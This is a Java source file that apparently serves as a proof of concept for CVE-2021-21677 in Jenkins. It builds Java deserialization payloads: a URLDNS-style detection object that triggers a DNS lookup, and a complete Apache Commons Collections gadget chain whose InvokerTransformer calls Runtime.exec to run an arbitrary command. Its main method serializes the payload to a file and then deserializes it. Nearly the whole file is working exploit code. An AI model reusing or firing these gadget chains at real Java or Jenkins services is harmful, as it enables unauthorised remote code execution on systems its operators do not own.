package com.r17a.jenkins;

import com.supeream.serial.Reflections;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.util.IdentityHashMap;
import java.util.Map;

public class CVE_2021_21677 {
    public static void main(String[] args) throws Exception {


        IdentityHashMap map = new IdentityHashMap();
        HashMap hashMap = getObject("http://127.0.0.1:8000");
//        BadAttributeValueExpException calc = getObject1("calc");
        map.put(1, hashMap);

        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("E:\\coverage-report"));
        objectOutputStream.writeObject(hashMap);

        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("E:\\coverage-report"));
        objectInputStream.readObject();
    }

    private static HashMap getObject(final String url) throws Exception {

        //Avoid DNS resolution during payload creation
        //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.
        URLStreamHandler handler = new SilentURLStreamHandler();

        // HashMap that will contain the URL
        HashMap ht = new HashMap();
        // URL to use as the Key
        URL u = new URL(null, url, handler);
        //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.
        ht.put(u, url);
        // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.
        setFieldValue(u, "hashCode", -1);
        return ht;
    }

    /**
     * <p>This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.
     * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior
     * using the serialized object.</p>
     *
     * <b>Potential false negative:</b>
     * <p>If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the
     * second resolution.</p>
     */
    static class SilentURLStreamHandler extends URLStreamHandler {

        @Override
        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }

        @Override
        protected synchronized InetAddress getHostAddress(URL u) {
            return null;
        }
    }


    //通过反射为obj的属性赋值
    private static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }


    public static BadAttributeValueExpException getObject1(final String command) throws Exception {
        final String[] execArgs = new String[]{command};
        // inert chain for setup
        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{new ConstantTransformer(1)});
        // real chain for after setup
        final Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{
                        String.class, Class[].class}, new Object[]{
                        "getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{
                        Object.class, Object[].class}, new Object[]{
                        null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class}, execArgs),
                new ConstantTransformer(1)};

        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField("val");
        valfield.setAccessible(true);
        valfield.set(val, entry);

        // arm with actual transformer chain
        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);

        return val;
    }
}
